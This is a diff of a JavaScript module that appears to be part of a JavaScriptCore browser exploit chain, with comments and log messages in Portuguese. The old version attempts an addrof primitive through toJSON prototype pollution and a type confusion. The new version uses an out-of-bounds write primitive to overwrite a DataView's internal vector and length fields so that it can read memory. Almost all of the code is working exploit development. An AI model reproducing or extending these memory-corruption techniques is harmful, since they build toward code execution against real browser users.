@@ -1,210 +1,215 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Modificado para tentativa de addrof DIRETA)
-import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
+// js/script3/testArrayBufferVictimCrash.mjs (Correção do ReferenceError)
+import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    oob_array_buffer_real,
-    oob_write_absolute,
-    clearOOBEnvironment
+    oob_array_buffer_real, 
+    oob_dataview_real,     
+    oob_write_absolute,    
+    oob_read_absolute,     
+    clearOOBEnvironment,
+    isOOBReady
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-// Nome do módulo atualizado para refletir a tentativa de addrof
-export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v1";
+export const FNAME_MODULE_V28 = "GetterReconfigDV_Read_v1_ErrorFixed"; // Nome do módulo atualizado
 
-const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
-const VICTIM_AB_SIZE = 64;
+// Constantes CRUCIAIS que estavam causando ReferenceError
+const TARGET_DATA_VALUE_LOW = 0xFEEDF00D;
+const TARGET_DATA_VALUE_HIGH = 0xDEADBEEF;
+const TARGET_DATA_LOCATION_IN_OOB = 0x0300; 
 
-// Variáveis globais do script original
-let toJSON_call_details_v28 = null;
+// Outras Constantes
+const TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68 = 0x68;
+const TRIGGER_WRITE_OFFSET = 0x70;
+const TRIGGER_WRITE_VALUE = 0xFFFFFFFF;
+const DATA_COPY_DEST_OFFSET_IN_OOB = 0x0100;    
 
-// NOVA LÓGICA PARA ADDROF: Objeto cujo endereço queremos vazar.
-// Será acessível dentro da sonda toJSON através de uma variável de escopo mais amplo se necessário,
-// ou definido no escopo de executeArrayBufferVictimCrashTest e acessado pela sonda.
-// Para simplificar, vamos definir no escopo de executeArrayBufferVictimCrashTest e criar uma
-// referência global temporária para a sonda usar.
-let object_to_leak_for_addrof_attempt = null;
+// Offsets para reconfigurar o oob_dataview_real
+const OOB_DV_M_VECTOR_OFFSET_ABS = 0x58 + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; 
+const OOB_DV_M_LENGTH_OFFSET_ABS = 0x58 + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; 
 
+let getter_object_ref = null;
+let address_used_by_getter_for_reconfig = null; 
+let data_successfully_read_after_reconfig = false;
 
-// toJSON Ultra-Minimalista do seu script original, AGORA COM A TENTATIVA DE ESCRITA PARA ADDROF
-function toJSON_V28_MinimalProbe_With_AddrofAttempt() {
-    // Estrutura original para toJSON_call_details_v28
-    toJSON_call_details_v28 = {
-        probe_variant: "V28_Probe_With_Addrof", // Nome da sonda atualizado
-        this_type_in_toJSON: "N/A_before_call",
-        error_in_toJSON: null,
-        probe_called: false // Importante para o log
-    };
+function ReconfigDVAndReadGetterFixed() { // Nome da função do getter ligeiramente alterado para rastreamento
+    logS3(`>>>> [ReconfigDVAndReadGetterFixed ACIONADO!] <<<<`, "vuln", `${FNAME_MODULE_V28}.Getter`);
+    data_successfully_read_after_reconfig = false;
+    address_used_by_getter_for_reconfig = null;
+
+    let original_oob_dv_m_vector = null;
+    let original_oob_dv_m_length = null;
 
     try {
-        toJSON_call_details_v28.probe_called = true;
-        toJSON_call_details_v28.this_type_in_toJSON = Object.prototype.toString.call(this);
-        logS3(`[toJSON_Probe_With_Addrof] 'this' é o objeto vítima. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "leak");
+        original_oob_dv_m_vector = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET_ABS, 8);
+        original_oob_dv_m_length = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET_ABS, 4);
+        logS3(`    [GetterFixed] Estado Original DV: m_vector=${original_oob_dv_m_vector.toString(true)}, m_length=${toHex(original_oob_dv_m_length)}`, "info");
 
-        // MODIFICADO PARA ADDROF: Se a Heisenbug ocorrer...
-        if (this === victim_ab_ref_for_original_test && toJSON_call_details_v28.this_type_in_toJSON === '[object Object]') {
-            logS3(`[toJSON_Probe_With_Addrof] HEISENBUG CONFIRMADA! Tentando escrever object_to_leak_for_addrof_attempt em this[0]...`, "vuln");
-            if (object_to_leak_for_addrof_attempt) {
-                this[0] = object_to_leak_for_addrof_attempt; // A escrita crucial!
-                logS3(`[toJSON_Probe_With_Addrof] Escrita de referência em this[0] (supostamente) realizada.`, "info");
-            } else {
-                logS3(`[toJSON_Probe_With_Addrof] object_to_leak_for_addrof_attempt é null. Escrita não tentada.`, "warn");
-            }
-        } else if (this === victim_ab_ref_for_original_test) {
-            logS3(`[toJSON_Probe_With_Addrof] Heisenbug NÃO confirmada. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "warn");
+        const qword_new_m_vector_target = oob_read_absolute(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68, 8);
+        if (!isAdvancedInt64Object(qword_new_m_vector_target)) {
+             logS3(`    [GetterFixed] Valor lido de ${toHex(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68)} não é AdvancedInt64.`, "error");
+             return "getter_error_reading_target_ptr";
+        }
+        address_used_by_getter_for_reconfig = qword_new_m_vector_target;
+        logS3(`    [GetterFixed] Novo m_vector alvo (lido de ${toHex(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68)}): ${address_used_by_getter_for_reconfig.toString(true)}`, "leak");
+
+        const new_m_vector_value_low = address_used_by_getter_for_reconfig.low();
+        const new_m_vector_value_high = address_used_by_getter_for_reconfig.high();
+        
+        // A condição de validação para o que esperamos que seja o offset alvo (deve estar na parte baixa do QWORD lido de 0x68)
+        if (new_m_vector_value_high === 0 && new_m_vector_value_low < oob_array_buffer_real.byteLength - 8 && new_m_vector_value_low === TARGET_DATA_LOCATION_IN_OOB) {
+            logS3(`    [GetterFixed] Novo m_vector (offset ${toHex(new_m_vector_value_low)}) validado. Reconfigurando DV...`, "info");
+            
+            // Reconfigurar oob_dataview_real para apontar para new_m_vector_value_low (como offset)
+            // O m_vector do DataView espera um ponteiro absoluto. Se estivermos trabalhando dentro do oob_array_buffer_real,
+            // e o motor JS trata m_vector como um offset do início do ArrayBuffer associado se a parte alta for 0,
+            // então podemos passar AdvancedInt64(offset, 0).
+            const new_m_vector_for_dv = new AdvancedInt64(new_m_vector_value_low, 0); // Offset na parte baixa, parte alta 0
+            const new_m_length_value = 16; 
+
+            logS3(`    [GetterFixed] Escrevendo m_vector (${new_m_vector_for_dv.toString(true)}) em ${toHex(OOB_DV_M_VECTOR_OFFSET_ABS)}`, "info");
+            oob_write_absolute(OOB_DV_M_VECTOR_OFFSET_ABS, new_m_vector_for_dv, 8);
+            logS3(`    [GetterFixed] Escrevendo m_length (${toHex(new_m_length_value)}) em ${toHex(OOB_DV_M_LENGTH_OFFSET_ABS)}`, "info");
+            oob_write_absolute(OOB_DV_M_LENGTH_OFFSET_ABS, new_m_length_value, 4);
+
+            logS3(`    [GetterFixed] Tentando ler ${new_m_length_value} bytes de offset ${toHex(new_m_vector_value_low)} (via oob_dataview_real reconfigurado)...`, "info");
+            
+            const data_low = oob_dataview_real.getUint32(0, true); 
+            const data_high = oob_dataview_real.getUint32(4, true);
+            const data_read_from_reconfigured_dv = new AdvancedInt64(data_low, data_high);
+            
+            logS3(`    [GetterFixed] Dados lidos via DV reconfigurado: ${data_read_from_reconfigured_dv.toString(true)}`, "leak");
+
+            oob_write_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, data_read_from_reconfigured_dv, 8);
+            data_successfully_read_after_reconfig = true;
+            logS3(`    [GetterFixed] Dados lidos copiados para ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}.`, "info");
+
+        } else {
+            logS3(`    [GetterFixed] Endereço alvo lido de 0x68 (${address_used_by_getter_for_reconfig.toString(true)}) não é um offset simples válido ou não corresponde a ${toHex(TARGET_DATA_LOCATION_IN_OOB)}. Esperado Low=${toHex(TARGET_DATA_LOCATION_IN_OOB)}, High=0.`, "warn");
         }
 
     } catch (e) {
-        toJSON_call_details_v28.error_in_toJSON = `${e.name}: ${e.message}`;
-        logS3(`[toJSON_Probe_With_Addrof] ERRO na sonda: ${e.name} - ${e.message}`, "error");
+        logS3(`    ERRO DENTRO DO GetterFixed: ${e.name} - ${e.message}\n${e.stack}`, "critical");
+    } finally {
+        if (isAdvancedInt64Object(original_oob_dv_m_vector) && typeof original_oob_dv_m_length === 'number') {
+            try {
+                logS3(`    [GetterFixed] Restaurando oob_dataview_real para m_vector=${original_oob_dv_m_vector.toString(true)}, m_length=${toHex(original_oob_dv_m_length)}...`, "info");
+                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET_ABS, original_oob_dv_m_vector, 8);
+                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET_ABS, original_oob_dv_m_length, 4);
+                logS3(`    [GetterFixed] oob_dataview_real restaurado.`, "info");
+            } catch (e_restore) {
+                 logS3(`    [GetterFixed] ERRO ao tentar restaurar oob_dataview_real: ${e_restore.message}`, "error");
+            }
+        } else {
+            logS3(`    [GetterFixed] Não foi possível restaurar oob_dataview_real (valores originais não capturados).`, "warn");
+        }
     }
-    // Retorno original da sua sonda
-    return { minimal_probe_executed: true };
+    return "reconfig_dv_getter_fixed_executed";
 }
 
-// Variável para manter a referência ao victim_ab para a sonda
-let victim_ab_ref_for_original_test = null;
-
 export async function executeArrayBufferVictimCrashTest() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug Estável e Tentativa de Addrof ---`, "test", FNAME_CURRENT_TEST);
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.attemptReconfigDVRead`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste de Leitura com Reconfig. DV via Getter (Erro Corrigido) ---`, "test", FNAME_CURRENT_TEST);
     document.title = `${FNAME_MODULE_V28} Inic...`;
 
-    // Resetar detalhes da sonda
-    toJSON_call_details_v28 = null;
-    victim_ab_ref_for_original_test = null; // Resetar referência
-    // NOVA LÓGICA PARA ADDROF: Definir o objeto alvo aqui
-    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject" }; // Objeto simples
+    address_used_by_getter_for_reconfig = null;
+    data_successfully_read_after_reconfig = false;
+    getter_object_ref = {};
 
     let errorCapturedMain = null;
-    let stringifyOutput = null;
-    // let potentiallyCrashed = true; // Não vamos mais assumir crash, focaremos no addrof
-    
-    // NOVA LÓGICA PARA ADDROF: Estrutura para resultado do addrof
-    let addrof_result = {
+    let exploit_result = {
         success: false,
-        leaked_address_as_double: null,
-        leaked_address_as_int64: null,
-        message: "Addrof não tentado ou Heisenbug não ocorreu."
+        address_targeted_str: null,
+        data_planted_at_target_str: null,
+        data_read_and_copied_str: null,
+        message: "Teste não iniciado."
     };
-    
-    // Alvo da corrupção que funcionou no seu log original [22:49:03]
-    const corruptionTargetOffsetInOOBAB = 0x7C;
 
     try {
-        // PASSO 0: Configurar OOB (como no seu script original)
-        // lastStep = "oob_setup"; // (Removido lastStep para simplificar)
-        await triggerOOB_primitive({ force_reinit: true }); // Forçar re-init para consistência
-        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
-        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
-        logS3(`   Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);
+        await triggerOOB_primitive({ force_reinit: true });
+        if (!isOOBReady()) { 
+            throw new Error("OOB Init falhou ou ambiente não está pronto."); 
+        }
+        logS3("Ambiente OOB inicializado e pronto.", "info", FNAME_CURRENT_TEST);
 
-        // PASSO 1: Escrita OOB CRÍTICA (como no seu script original)
-        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
-        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
-        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);
+        const target_data_to_plant = new AdvancedInt64(TARGET_DATA_VALUE_LOW, TARGET_DATA_VALUE_HIGH);
+        exploit_result.data_planted_at_target_str = target_data_to_plant.toString(true);
+        logS3(`PASSO 1a: Plantando dados de teste ${exploit_result.data_planted_at_target_str} em oob_buffer[${toHex(TARGET_DATA_LOCATION_IN_OOB)}]`, "info", FNAME_CURRENT_TEST);
+        oob_write_absolute(TARGET_DATA_LOCATION_IN_OOB, target_data_to_plant, 8);
+
+        // Plantar o QWORD que o getter deve ler de 0x68.
+        // Queremos que qword_new_m_vector_target.low() seja TARGET_DATA_LOCATION_IN_OOB (0x300)
+        // e qword_new_m_vector_target.high() seja 0.
+        const qword_for_getter_to_read = new AdvancedInt64(TARGET_DATA_LOCATION_IN_OOB, 0);
+        logS3(`PASSO 1b: Plantando QWORD ${qword_for_getter_to_read.toString(true)} (contendo o offset alvo) em oob_buffer[${toHex(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68)}] (0x68)`, "info", FNAME_CURRENT_TEST);
+        oob_write_absolute(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68, qword_for_getter_to_read, 8); 
         
-        await PAUSE_S3(100); 
+        oob_write_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0,0), 8);
 
-        // PASSO 2: Criar victim_ab e Float64Array view sobre ele
-        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE); // Usar a variável global para a sonda
-        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
-        float64_view_on_victim.fill(0.123456789101112); // Preencher com um padrão único
+        Object.defineProperty(getter_object_ref, 'triggerReconfigReadV2', { // Nome da prop do getter diferente para evitar cache
+            get: ReconfigDVAndReadGetterFixed,
+            configurable: true
+        });
+        logS3("PASSO 2: Getter 'triggerReconfigReadV2' definido.", "info", FNAME_CURRENT_TEST);
 
-        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_MinimalProbe_With_AddrofAttempt.name}...`, "test", FNAME_CURRENT_TEST);
-        
-        const ppKey = 'toJSON';
-        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
-        let pollutionApplied = false;
+        logS3(`PASSO 3: Escrevendo valor de trigger ${toHex(TRIGGER_WRITE_VALUE)} em oob_buffer[${toHex(TRIGGER_WRITE_OFFSET)}] (0x70)...`, "warn", FNAME_CURRENT_TEST);
+        oob_write_absolute(TRIGGER_WRITE_OFFSET, TRIGGER_WRITE_VALUE, 4);
+        logS3(`  Escrita de trigger realizada.`, "info", FNAME_CURRENT_TEST);
 
+        const val_at_0x68_post_trigger = oob_read_absolute(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68, 8);
+        logS3(`  Valor em ${toHex(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68)} (lido por oob_read_absolute) APÓS trigger e ANTES do getter: ${isAdvancedInt64Object(val_at_0x68_post_trigger) ? val_at_0x68_post_trigger.toString(true) : "Erro"}`, "important");
+
+        logS3("PASSO 4: Tentando acionar o getter acessando getter_object_ref.triggerReconfigReadV2...", "warn", FNAME_CURRENT_TEST);
         try {
-            Object.defineProperty(Object.prototype, ppKey, {
-                value: toJSON_V28_MinimalProbe_With_AddrofAttempt, // Usar a sonda modificada
-                writable: true, configurable: true, enumerable: false
-            });
-            pollutionApplied = true;
-            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_MinimalProbe_With_AddrofAttempt.name}.`, "info", FNAME_CURRENT_TEST);
+            const getter_return_value = getter_object_ref.triggerReconfigReadV2;
+            logS3(`  Acesso à propriedade do getter retornou: ${getter_return_value}`, "info", FNAME_CURRENT_TEST);
+        } catch (e_getter_access) {
+            logS3(`  ERRO ao tentar acionar o getter: ${e_getter_access.name} - ${e_getter_access.message}`, "error", FNAME_CURRENT_TEST);
+        }
 
-            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)... (Ponto esperado da Heisenbug e escrita para addrof)`, "warn", FNAME_CURRENT_TEST);
-            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
-            // potentiallyCrashed = false; // Removido
-            
-            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Resultado (da sonda): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
-            // Detalhes agora são preenchidos pela própria sonda em toJSON_call_details_v28
-            logS3(`  Detalhes da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
+        exploit_result.address_targeted_str = address_used_by_getter_for_reconfig ? address_used_by_getter_for_reconfig.toString(true) : "N/A";
 
-            // Verificar se a Heisenbug ocorreu (baseado no que a sonda preencheu em toJSON_call_details_v28)
-            if (toJSON_call_details_v28 && toJSON_call_details_v28.probe_called && toJSON_call_details_v28.this_type_in_toJSON === "[object Object]") {
-                logS3(`  HEISENBUG CONFIRMADA (fora da sonda, via toJSON_call_details_v28)! Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
-                
-                // NOVA LÓGICA PARA ADDROF: Ler do buffer após a tentativa de escrita na sonda
-                logS3("PASSO 3: Verificando float64_view_on_victim[0] APÓS Heisenbug e tentativa de escrita na sonda...", "warn", FNAME_CURRENT_TEST);
-                const value_read_as_double = float64_view_on_victim[0];
-                addrof_result.leaked_address_as_double = value_read_as_double;
-                logS3(`  Valor lido de float64_view_on_victim[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);
+        if (data_successfully_read_after_reconfig) {
+            const copied_data = oob_read_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, 8);
+            exploit_result.copied_data_str = isAdvancedInt64Object(copied_data) ? copied_data.toString(true) : "ERRO_LEITURA_COPIA";
+            logS3(`PASSO 5: Dados copiados para ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}: ${exploit_result.copied_data_str}`, "leak", FNAME_CURRENT_TEST);
 
-                const double_buffer_for_conversion = new ArrayBuffer(8);
-                const double_view_for_conversion = new Float64Array(double_buffer_for_conversion);
-                const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
-                double_view_for_conversion[0] = value_read_as_double;
-                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
-                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
-
-                if (value_read_as_double !== 0 && value_read_as_double !== 0.123456789101112 && // Não é zero nem o preenchimento
-                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
-                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
-                    addrof_result.success = true;
-                    addrof_result.message = "Heisenbug confirmada E leitura de double sugere um ponteiro.";
-                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
-                } else {
-                    addrof_result.message = "Heisenbug confirmada, mas valor lido de float64_view_on_victim[0] não parece ponteiro ou buffer não foi alterado.";
-                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST);
-                    document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
-                }
+            if (isAdvancedInt64Object(copied_data) && copied_data.equals(target_data_to_plant)) {
+                exploit_result.success = true;
+                exploit_result.message = "SUCESSO! Getter leu o endereço/offset alvo de 0x68, reconfigurou DV, leu dados e copiou corretamente!";
+                document.title = `${FNAME_MODULE_V28}: DV RECONFIG OK!`;
+                logS3(`  !!!! ${exploit_result.message} !!!!`, "vuln", FNAME_CURRENT_TEST);
             } else {
-                let msg = "Heisenbug (this como [object Object]) não foi confirmada via toJSON_call_details_v28.";
-                if(toJSON_call_details_v28) msg += ` Tipo obs: ${toJSON_call_details_v28.this_type_in_toJSON}`;
-                addrof_result.message = msg;
-                logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
-                document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou`;
+                exploit_result.message = "Dados copiados, mas não correspondem aos dados originais plantados.";
+                document.title = `${FNAME_MODULE_V28}: DV Reconfig Cópia Incorreta`;
             }
-
-        } catch (e_str) {
-            errorCapturedMain = e_str;
-            logS3(`   ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
-            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
-            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
-        } finally {
-            if (pollutionApplied) {
-                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
-                else delete Object.prototype[ppKey];
-            }
+        } else {
+            exploit_result.message = "Getter foi acionado, mas os dados não foram marcados como lidos/copiados com sucesso após reconfiguração do DV.";
+            logS3(`  Getter acionado, mas 'data_successfully_read_after_reconfig' é false. Endereço alvo que o getter usou: ${exploit_result.address_targeted_str}`, "warn", FNAME_CURRENT_TEST);
+            document.title = `${FNAME_MODULE_V28}: Falha Reconfig DV`;
         }
-
     } catch (e_outer_main) {
-        errorCapturedMain = e_outer_main;
-        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
+        errorCapturedMain = e_outer_main; // Captura o erro
+        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
         if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
-        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
-        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}`;
+        exploit_result.message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`; // Adiciona mensagem de erro
+        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
     } finally {
-        clearOOBEnvironment();
-        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
-        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
-        if(addrof_result.leaked_address_as_int64){
-            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
-        }
-         // Limpar referências globais
-        object_to_leak_for_addrof_attempt = null;
-        victim_ab_ref_for_original_test = null;
+        clearOOBEnvironment({force_clear_even_if_not_setup: true}); 
+        logS3(`--- ${FNAME_CURRENT_TEST} Concluído (Ambiente OOB limpo) ---`, "test", FNAME_CURRENT_TEST);
+        logS3(`Resultado Reconfig DV Read: Success=${exploit_result.success}, Msg='${exploit_result.message}'`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
+        logS3(`  Endereço Alvo Lido pelo Getter (de 0x68): ${exploit_result.address_targeted_str}`, "info", FNAME_CURRENT_TEST);
+        if(exploit_result.copied_data_str) logS3(`  Dados Copiados (de ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}): ${exploit_result.copied_data_str}`, "leak", FNAME_CURRENT_TEST);
+        getter_object_ref = null;
     }
-    // Manter a estrutura de retorno compatível com o que runHeisenbugReproStrategy_ABVictim espera,
-    // mas adicionando os detalhes do addrof.
+    
     return { 
-        errorOccurred: errorCapturedMain, 
-        potentiallyCrashed: false, // Se chegamos aqui, não crashou silenciosamente.
-        stringifyResult: stringifyOutput, 
-        toJSON_details: toJSON_call_details_v28, // Usar a variável global que a sonda preenche
-        addrof_attempt_result: addrof_result
+        errorOccurred: errorCapturedMain, // Retorna o erro capturado
+        exploit_attempt_result: exploit_result,
+        toJSON_details: { 
+            probe_variant: FNAME_MODULE_V28, 
+            this_type_in_toJSON: (exploit_result.success ? "getter_reconfig_dv_success" : "getter_reconfig_dv_error_or_failed"),
+        }
     };
 }
